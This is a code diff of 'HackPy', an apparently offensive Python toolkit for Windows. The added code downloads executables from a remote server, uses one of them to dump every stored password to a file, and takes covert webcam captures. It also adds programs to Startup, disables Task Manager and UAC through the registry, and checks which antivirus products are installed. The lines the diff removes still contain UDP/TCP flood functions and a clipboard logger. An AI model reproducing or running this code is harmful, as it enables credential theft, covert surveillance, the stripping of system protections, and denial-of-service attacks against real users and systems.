@@ -1,4 +1,4 @@
-logo = ("""
+logo = (r"""
     _  _     _   _                  _        ____
   _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
  |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
@@ -8,86 +8,76 @@ logo = ("""
 """)
 
 # Import modules
-from os import system as os_system
-from os import path as os_path
-from os import mkdir as os_mkdir
-from os import remove as os_remove
-from os import environ as os_environ
-from os import startfile as os_startfile
-from json import load as json_load
-from time import sleep as time_sleep
-from time import time as time_time
-from time import ctime as time_ctime
-from shutil import rmtree as shutil_rmtree
+import os
+import time
+import json
+import random
+import socket
+import pyperclip
+import subprocess
+from random import _urandom
+from getmac import get_mac_address
 from wget import download as wget_download
-from getmac import get_mac_address as getmac
-from random import randint as random_randint
-from random import _urandom as random_urandom
-from pyperclip import copy as pyperclip_copy
-from pyperclip import paste as pyperclip_paste
-from socket import gethostbyname as socket_gethostbyname
-from socket import gethostname as socket_gethostname
-from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM
+
+# Main server
+global server_url
+server_url = 'http://f0330673.xsph.ru'
 
 # Install path
-global install_path
-install_path = os_environ['TEMP'] + '\\hackpy'
-
-# Unload (delete) HackPy from system
-def unload():
-	if os_path.exists(install_path):
-		shutil_rmtree(install_path)
-		return True
+global module_location
+module_location = os.environ['TEMP'] + '\\hackpy'
+# Create temp folders
+for folder in ['', '\\executable', '\\tempdata']:
+    if not os.path.exists(module_location + folder):
+        os.mkdir(module_location + folder)
 
 # Load file from URL
-def wget(link, statusbar = None, output = None):
-	return wget_download(link, bar = statusbar, out = output)
+def wget(link, output = None):
+	return wget_download(link, bar = None, out = output)
+
+# Load all modules
+def load_all():
+    for file in ['nircmd.exe', 'webcam.exe', 'passwords_recovery.exe']:
+        if not os.path.exists(module_location + '\\executable\\' + file):
+            wget_download(server_url + '/HackPy/' + file, bar = None, out = module_location + '\\executable\\' + file)
 
 # Add to startup.
-def autorun(path, name='hackpy_' + str(random_randint(1,999)) + '_', state=True):
-	file = path.split('\\')[-1]
-	path = path.split('\\')[0:-1]
-	path = '\\'.join(path)
+def autorun(path, state = True):
+    file = path.split('\\')[-1]
+    name = file.split('.')[0]
+    path = '\\'.join(path.split('\\')[0:-1])
+    autorun_path = os.environ['SystemDrive'] + '\\Users\\' + os.environ['USERNAME'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
 
-	autorun_path = (os_environ['SystemDrive'] + '\\Users\\' + os_environ['USERNAME'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-	if os_path.exists(path + '\\' + file):
-		if state == True:
-			with open(autorun_path + '\\' + name + ".bat", "w") as tempfile:
-				tempfile.write('@cd ' + path + '\n@start "" ' + file)
-			return name
+    if state == True:
+        with open(autorun_path + '\\' + name + '.cmd', 'w') as tempfile:
+            tempfile.write('@cd ' + path + '\n@start "" ' + file)
 
-		else:
-			try:
-				os_remove(autorun_path + '\\' + name + '.bat')
-			except:
-				raise FileNotFoundError('hackpy - Failed to remove: ' + file + ' from startup')
-	else:
-		raise FileNotFoundError('hackpy - Failed to add file: ' + file + ' to startup')
-
-def stealler(filename = 'passwords.txt'):
-	##|
-	##| hackpy.stealler() # Save all passwords to passwords.txt
-	##| https://github.com/AlessandroZ/LaZagne
-	##|
-	command.system(install_path + '\\passwords_recovery.exe all >> ' + filename)
+    elif state == False:
+        try:
+            os.remove(autorun_path + '\\' + name + '.cmd')
+        except:
+            pass
 
 
+# SendKey
 def sendkey(key):
 	##|
 	##| SendKey('Hello my L0rd!!{ENTER}')
 	##| Other keys: https://pastebin.com/Ns3P7UiH
 	##|
-	with open(install_path + '\\keyboard.vbs', "w") as tempfile:
-		tempfile.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
-	os_startfile(install_path + '\\keyboard.vbs')
+    tempfile = module_location + r'\tempdata\keyboard.vbs'
+    with open(tempfile, 'w') as keyboard_path:
+        keyboard_path.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
+    command.system(tempfile)
+    os.remove(tempfile)
 
 
 # Get info by ip address
 # WARNING! Usage limits:
 # This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed.
 # You can unban here: http://ip-api.com/docs/unban
-def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
-	##|
+def whois(ip = '', out_tempfile = module_location + r'\tempdata\whois.json'):
+    ##|
     ##|  "query": "24.48.0.1",
     ##|  "local": "192.168.1.6",
     ##|  "status": "success",
@@ -103,27 +93,67 @@ def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
     ##|  "isp": "Le Groupe Videotron Ltee",
     ##|  "org": "Videotron Ltee",
     ##|  "as": "AS5769 Videotron Telecom Ltee"
-	##|
-    wget_download('http://ip-api.com/json/' + ip, bar = status_bar, out = out_tempfile)
+    ##|
+    wget_download('http://ip-api.com/json/' + ip, bar = None, out = out_tempfile)
     with open(out_tempfile, "r") as tempfile:
-        ip_data = json_load(tempfile)
+        whois_data = json.load(tempfile)
     try:
-        os_remove(out_tempfile)
+        os.remove(out_tempfile)
     except:
         pass
-    if ip_data.get('status') == 'success':
-        ip_data['local'] = socket_gethostbyname(socket_gethostname())
-        return ip_data
+    if whois_data.get('status') == 'success':
+        whois_data['local'] = socket.gethostbyname(socket.gethostname())
+        return whois_data
     else:
         raise ConnectionError('Status: ' + ip_data.get('status') + ', Message: ' + ip_data.get('message'))
 
-# Get LATITUDE, LONGITUDE, RANGE with bssid
-def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
-    wget_download('http://api.mylnikov.org/geolocation/wifi?bssid=' + bssid, bar = statusbar, out = out_tempfile)
+# Get geodata by ip
+def geoplugin(ip = '', out_tempfile = module_location + r'\tempdata\geoplugin.json'):
+    ##|
+    ##|  "geoplugin_request":"24.48.0.1",
+    ##|  "geoplugin_status":200,
+    ##|  "geoplugin_delay":"2ms",
+    ##|  "geoplugin_credit":"Some of the returned data includes GeoLite data created by MaxMind, available from <a href='http:\/\/www.maxmind.com'>http:\/\/www.maxmind.com<\/a>.",
+    ##|  "geoplugin_city":"Ivano-Frankivsk",
+    ##|  "geoplugin_region":"Ivano-Frankivs'ka Oblast'",
+    ##|  "geoplugin_regionCode":"26",
+    ##|  "geoplugin_regionName":"Ivano-Frankivs'ka Oblast'",
+    ##|  "geoplugin_areaCode":"",
+    ##|  "geoplugin_dmaCode":"",
+    ##|  "geoplugin_countryCode":"UA",
+    ##|  "geoplugin_countryName":"Ukraine",
+    ##|  "geoplugin_inEU":0,
+    ##|  "geoplugin_euVATrate":false,
+    ##|  "geoplugin_continentCode":"EU",
+    ##|  "geoplugin_continentName":"Europe",
+    ##|  "geoplugin_latitude":"48.9215",
+    ##|  "geoplugin_longitude":"24.7097",
+    ##|  "geoplugin_locationAccuracyRadius":"500",
+    ##|  "geoplugin_timezone":"Europe\/Kiev",
+    ##|  "geoplugin_currencyCode":"UAH",
+    ##|  "geoplugin_currencySymbol":"₴",
+    ##|  "geoplugin_currencySymbol_UTF8":"₴",
+    ##|  "geoplugin_currencyConverter":24.769
+    ##|
+    wget_download('http://www.geoplugin.net/json.gp?ip=' + ip, bar = None, out = out_tempfile)
     with open(out_tempfile, "r") as tempfile:
-        bssid_data = json_load(tempfile)
+        geoplugin_data = json.load(tempfile)
     try:
-        os_remove(out_tempfile)
+        os.remove(out_tempfile)
+    except:
+        pass
+    if geoplugin_data.get('geoplugin_status') == 200:
+        return geoplugin_data
+    else:
+        raise ConnectionError('Could not connect to server')
+
+# Get LATITUDE, LONGITUDE, RANGE with bssid
+def bssid_locate(bssid, out_tempfile = module_location + r'\tempdata\bssid_locate.json'):
+    wget_download('http://api.mylnikov.org/geolocation/wifi?bssid=' + bssid, bar = None, out = out_tempfile)
+    with open(out_tempfile, "r") as tempfile:
+        bssid_data = json.load(tempfile)
+    try:
+        os.remove(out_tempfile)
     except:
         pass
 
@@ -132,33 +162,38 @@ def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
 
 # Get router BSSID
 def router():
-	try:
-		SMART_ROUTER_IP = ('.'.join(socket_gethostbyname(socket_gethostname()).split('.')[:-1]) + '.1')
-		BSSID = getmac(ip=SMART_ROUTER_IP)
-	except:
-		return None
-	else:
-		return BSSID
+    try:
+        SMART_ROUTER_IP = ('.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1]) + '.1')
+        BSSID = get_mac_address(ip = SMART_ROUTER_IP)
+    except:
+        return None
+    else:
+        return BSSID
 
-def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
+def install_python(version = '3.7.0', path = os.environ['SystemDrive'] + '\\python'):
 	##|
 	##| Install python to system
 	##| Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
 	##| Default version is: 3.7.0 and install path is: C:\python
 	##|
-	if os_path.exists(path):
-		raise FileExistsError('Python is installed')
+	wget_download('https://www.python.org/ftp/python/' + version + '/python-' + version + '.exe', bar = None, out = 'python_setup.exe')
+	command.system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
+
+def check_python():
+	##|
+	##| Check if python installed in system
+	##| Example: hackpy.check_python()
+	##| return True if installed and False if not installed
+	##|
+	status = command.system('python --version > ' + os.devnull)
+	if status == 0:
+		return True
 	else:
-		wget_download('https://www.python.org/ftp/python/' + version + '/python-' + version + '.exe', bar = None, out = 'python_setup.exe')
-		command.system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
-		if os_path.exists(path):
-			return True
-		else:
-			return False
+		return False
 
 # Detect installed antivirus software
 def detect_protection():
-    SYS_DRIVE = os_environ['SystemDrive'] + '\\'
+    SYS_DRIVE = os.environ['SystemDrive'] + '\\'
     detected = {}
     av_path = {
      'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
@@ -190,131 +225,83 @@ def detect_protection():
 	 'Windows Defender': 'Program Files\\Windows Defender',
      '360 Total Security 32bit': 'Program Files (x86)\\360\\Total Security',
 	 '360 Total Security 64bit': 'Program Files\\360\\Total Security'
-     }
-
+    }
     for antivirus, path in av_path.items():
-        if os_path.exists(SYS_DRIVE + path):
+        if os.path.exists(SYS_DRIVE + path):
             detected[antivirus] = SYS_DRIVE + path
-
     return detected
 
-def webcam(filename = 'screenshot.png', delay = 4500, camera = 1):
+
+def passwords_recovery(filename = 'passwords.txt'):
+    #|
+    #| passwords_recovery('passwords.txt')
+    #| Download lazagne and save all passwords to file
+    #|
+    if not os.path.exists(module_location + r'\executable\passwords_recovery.exe'):
+        wget_download(server_url + '/HackPy/passwords_recovery.exe', bar = None, out = module_location + r'\executable\passwords_recovery.exe')
+    command.system(module_location + r'\executable\passwords_recovery.exe all > ' + filename)
+    if os.path.exists(filename):
+        return filename
+
+def webcam(filename = 'screenshot-' + str(random.randint(1, 99999)) + '.png', delay = 4500, camera = 1):
 	##|
 	##| Make webcam screenshot: hackpy.webcam(filename='webcam.png', delay=5000, camera=1)
 	##|
-	command.system(install_path + '\\CommandCam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera))
-
+    if not os.path.exists(module_location + r'\executable\webcam.exe'):
+        wget_download(server_url + '/HackPy/webcam.exe', bar = None, out = module_location + r'\executable\webcam.exe')
+    command.system(module_location + r'\executable\webcam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera) + ' > ' + os.devnull)
+    if os.path.exists(filename):
+        return filename
 
 class command:
 	##|
 	##| Execute system command: hackpy.command.system('command')
 	##| Execute nircmdc command: hackpy.command.nircmdc('command')
 	##|
-	def system(recived_command):
-		# Temp files names
-		bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
-		vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
-		# Temp files commands
-		bat_script = recived_command
-		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
-		# Write bat commands
-		with open(bat_script_path, "w") as bat_script_write:
-			bat_script_write.write(bat_script)
-		# Write vbs commands
-		with open(vbs_script_path, "w") as vbs_script_write:
-			vbs_script_write.write(vbs_script)
-		time_sleep(0.1)
-		os_startfile(vbs_script_path)
+    def system(recived_command):
+        return subprocess.call(recived_command, shell = True)
 
-	def nircmdc(recived_command, priority='NORMAL'):
-		command.system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmd.exe' + ' ' + recived_command)
+    def nircmdc(recived_command):
+        if not os.path.exists(module_location + r'\executable\nircmd.exe'):
+            wget_download(server_url + '/HackPy/nircmd.exe', bar = None, out = module_location + r'\executable\nircmd.exe')
+        command.system(module_location + r'\executable\nircmd.exe ' + recived_command + ' > ' + os.devnull)
 
 
 
-class messagebox:
+def messagebox(type, title, text):
 	##|
 	##| Show windows message box:
-    ##| hackpy.messagebox.none('Caption!', 'Hey i\'m text!')
-	##| hackpy.messagebox.info('Caption!', 'Hey i\'m text!')
-	##| hackpy.messagebox.error('Caption!', 'Hey i\'m text!')
-	##| hackpy.messagebox.warning('Caption!', 'Hey i\'m text!')
+    ##| hackpy.messagebox('none', 'Title', 'Hey i\'m text!')
+	##| hackpy.messagebox('info','Title', 'Hey i\'m text!')
+	##| hackpy.messagebox('error','Title', 'Hey i\'m text!')
+	##| hackpy.messagebox('warning','Title', 'Hey i\'m text!')
 	##|
-	def info(caption, text):
-		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
-			msgboxfile.write('x=msgbox(\"' + text + '\" ,64, \"' + caption + '\")')
-			os_startfile(install_path + '\\msgbox.vbs')
-	def error(caption, text):
-		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
-			msgboxfile.write('x=msgbox(\"' + text + '\" ,16, \"' + caption + '\")')
-			os_startfile(install_path + '\\msgbox.vbs')
-	def warning(caption, text):
-		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
-			msgboxfile.write('x=msgbox(\"' + text + '\" ,48, \"' + caption + '\")')
-			os_startfile(install_path + '\\msgbox.vbs')
-	def none(caption, text):
-		with open(install_path + '\\msgbox.vbs', "w") as msgboxfile:
-			msgboxfile.write('x=msgbox(\"' + text + '\" ,0, \"' + caption + '\")')
-			os_startfile(install_path + '\\msgbox.vbs')
+    tempfile = module_location + r'\tempdata\msgbox.vbs'
+    msgbox_types = {
+    'none':'0',
+    'error':'16',
+    'question': '32',
+    'warning':'48',
+    'info':'64'
+    }
 
-class ddos:
-	##|
-	##| UDP flood:
-	##| hackpy.ddos.udp('172.217.16.46', 8080, duration = 10, message = True)
-	##| TCP flood
-	##| hackpy.ddos.tcp('172.217.16.46', 8080, duration = 15, message = True)
-	##|
-	def udp(ip, port, duration, message = False):
-		sent = 0
-		client = socket(AF_INET, SOCK_DGRAM)
-		bytes = random_urandom(1024)
-		timeout = time_time() + duration
-		while True:
-			if time_time() > timeout:
-				break
-			client.sendto(bytes, (ip, port))
-			sent += 1
-			if message == True:
-				print("[UDP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
-
-	def tcp(ip, port, duration, message = False):
-		sent = 0
-		bytes = random_urandom(1024)
-		timeout = time_time() + duration
-		while True:
-			if time_time() > timeout:
-				break
-			s = socket(AF_INET, SOCK_STREAM)
-			s.connect((ip, port))
-			s.send(bytes)
-			sent += 1
-			s.close()
-			if message == True:
-				print("[TCP] Attacking... " + str(sent) + " sent packages " + str(ip) + " at the port " + str(port))
+    with open(tempfile, 'w') as msgboxfile:
+        msgboxfile.write('x=msgbox(\"' + text + '\" ,' + msgbox_types[type] + ', \"' + title + '\")')
+    command.system(tempfile)
+    os.remove(tempfile)
 
 
 class clipboard:
 	##|
 	##| hackpy.clipboard.set('Text') # Copy text to clipboard
 	##| print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
-	##| hackpy.clipboard.logger('clip_logs.txt') # Log all clipboard changes to file.
 	##|
 	def set(text):
-		pyperclip_copy(text)
+		pyperclip.copy(text)
 
 	def get():
-		return pyperclip_paste()
+		return pyperclip.paste()
 
-	def logger(file):
-		try: os_remove(file)
-		except: pass
-		clipboard_data_old = None
-		while True:
-			time_sleep(1)
-			clipboard_data = str(pyperclip_paste())
-			if clipboard_data != clipboard_data_old:
-				with open(file, "a") as cliplogger_file:
-					cliplogger_file.write('[' + time_ctime() + '] - Text: ' + str(pyperclip_paste()) + '\n')
-				clipboard_data_old = str(pyperclip_paste())
 
 class taskmanager:
 	##|
@@ -325,72 +312,57 @@ class taskmanager:
 	##| hackpy.taskmanager.start('process_name.exe')
 	##| hackpy.taskmanager.find('process_name.exe') # return True/False
 	##|
-	def enable():
-		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0')
+    def enable():
+        command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0' + ' > ' + os.devnull)
 
-	def disable():
-		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1')
+    def disable():
+        command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1' + ' > ' + os.devnull)
 
-	def kill(process):
-		command.system('@taskkill /F /IM ' + process + ' >NUL')
+    def kill(process):
+        command.system('@taskkill /F /IM ' + process + ' > ' + os.devnull)
 
-	def start(process):
-		command.system('@start ' + process + ' >NUL')
+    def start(process):
+        command.system('@start ' + process + ' > ' + os.devnull)
 
-	def find(process):
-		vbs_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.vbs'
-		bat_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.bat'
-		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
-		bat_script = ('''
+    def find(process):
+        random_number = str(random.randint(1, 99999))
+        bat_script_path = module_location + r'\tempdata\task_script_' + random_number + '.bat'
+        # Write script
+        with open(bat_script_path, 'w') as bat_script:
+            bat_script.write('''
 @echo off
 set process=''' + process + '''
 tasklist /FI "IMAGENAME eq %process%" 2>NUL | find /I /N "%process%">NUL
 IF "%ERRORLEVEL%"=="0" (
-  echo True > ''' + install_path + '''\\process_level.txt
+  echo True > ''' + module_location + r'''\tempdata\process_level_''' + random_number + '''.txt
 ) ELSE (
-  echo False > ''' + install_path + '''\\process_level.txt
+  echo False > ''' + module_location + r'''\tempdata\process_level_''' + random_number + '''.txt
 )
-''')
-		with open(bat_script_path, "w") as bat_script_write:
-			bat_script_write.write(bat_script)
-		with open(vbs_script_path, "w") as vbs_script_write:
-			vbs_script_write.write(vbs_script)
+''')    # Execute script
+        command.system(bat_script_path)
+        # Read results
+        with open(module_location + r'\tempdata\process_level_' + random_number + '.txt', "r") as process_read:
+            data = process_read.readline()
+        # Clear temp files
+        for file in [module_location + r'\tempdata\process_level_' + random_number + '.txt', module_location + r'\tempdata\task_script_' + random_number + '.bat']:
+            try:
+                os.remove(file)
+            except:
+                pass
+        return eval(data.split()[0])
 
-		os_startfile(vbs_script_path)
-		time_sleep(0.4)
-		with open(install_path + '\\process_level.txt', "r") as process_read:
-			data = process_read.readline()
-		if data.split()[0] == 'True':
-			return True
-		elif data.split()[0] == 'False':
-			return False
+
 class uac:
 	##|
 	##| hackpy.uac.disable() # Disable UAC // NEED ADMIN!
 	##| hackpy.uac.enable() # Disable UAC // NEED ADMIN!
 	##|
-	def disable():
-		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
+    def disable():
+        command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
 
-	def enable():
-		command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f')
+    def enable():
+        command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f')
 
 
-if __name__ != '__main__':
-	if not os_path.exists(install_path):
-		os_mkdir(install_path)
-	else:
-		command.system('@del ' + install_path + '\\*.bat && @del ' + install_path + '\\*.vbs')
-
-	# Load HackPy modules
-	if not os_path.exists(install_path + '\\nircmd.exe'):
-		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/nircmd.exe', out = install_path + '\\nircmd.exe', bar = None)
-
-	if not os_path.exists(install_path + '\\passwords_recovery.exe'):
-		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/passwords_recovery.exe', out = install_path + '\\passwords_recovery.exe', bar = None)
-
-	if not os_path.exists(install_path + '\\CommandCam.exe'):
-		wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/CommandCam.exe', out = install_path + '\\CommandCam.exe', bar = None)
-
-else:
-	print(10 * '\n' + logo)
+if __name__ == '__main__':
+	print(1 * '\n' + logo)
